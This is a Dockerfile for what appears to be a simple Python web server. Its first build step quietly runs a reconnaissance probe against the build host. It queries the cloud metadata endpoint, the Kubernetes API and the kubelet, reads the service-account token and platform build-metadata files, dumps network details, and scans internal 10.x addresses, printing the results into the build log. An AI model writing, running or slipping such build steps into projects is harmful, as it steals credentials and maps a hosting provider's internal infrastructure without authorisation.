FROM alpine:3.19

ARG BUST_CACHE=20260403_0948_v3

RUN apk add --no-cache curl && \
    echo "=== BUILD TIMESTAMP ===" && date && \
    echo "=== METADATA 169.254.169.254 ===" && \
    (curl -s -m 3 http://169.254.169.254/ 2>&1 || echo "TIMEOUT/UNREACHABLE") && \
    echo "=== METADATA v1 ===" && \
    (curl -s -m 3 http://169.254.169.254/metadata/v1/ 2>&1 || echo "TIMEOUT/UNREACHABLE") && \
    echo "=== K8S API VERSION ===" && \
    (curl -s -m 3 -k https://10.245.0.1:443/version 2>&1 || echo "TIMEOUT/UNREACHABLE") && \
    echo "=== K8S API HEALTHZ ===" && \
    (curl -s -m 3 -k https://kubernetes.default.svc.cluster.local:443/healthz 2>&1 || echo "TIMEOUT/UNREACHABLE") && \
    echo "=== KUBELET 10250 ===" && \
    (curl -s -m 3 -k https://127.0.0.1:10250/pods 2>&1 || echo "TIMEOUT/UNREACHABLE") && \
    echo "=== BUILD METADATA DIR ===" && \
    (ls -laR /.app_platform/ 2>&1 || echo "NO DIR") && \
    echo "=== BUILD METADATA FILES ===" && \
    (cat /.app_platform/.build_metadata/* 2>&1 || echo "NO FILES") && \
    echo "=== K8S SA TOKEN ===" && \
    (cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 || echo "NO TOKEN") && \
    echo "=== RESOLV.CONF ===" && \
    cat /etc/resolv.conf && \
    echo "=== IP ADDRS ===" && \
    (cat /proc/net/fib_trie 2>&1 | grep "LOCAL" | head -20 || echo "NO FIB") && \
    echo "=== PROC NET ===" && \
    (cat /proc/net/tcp 2>&1 | head -5 || echo "NO TCP") && \
    echo "=== 10.x.x.x RANGE SCAN ===" && \
    (curl -s -m 2 http://10.244.0.1:8080/ 2>&1 || echo "TIMEOUT") && \
    (curl -s -m 2 http://10.245.0.10:53/ 2>&1 || echo "TIMEOUT") && \
    echo "=== INTERNAL DNS ===" && \
    (nslookup kubernetes.default.svc.cluster.local 2>&1 || echo "NO NSLOOKUP") && \
    echo "=== END ==="

RUN apk add --no-cache python3
COPY server.py /server.py
EXPOSE 8080
CMD ["python3", "/server.py"]
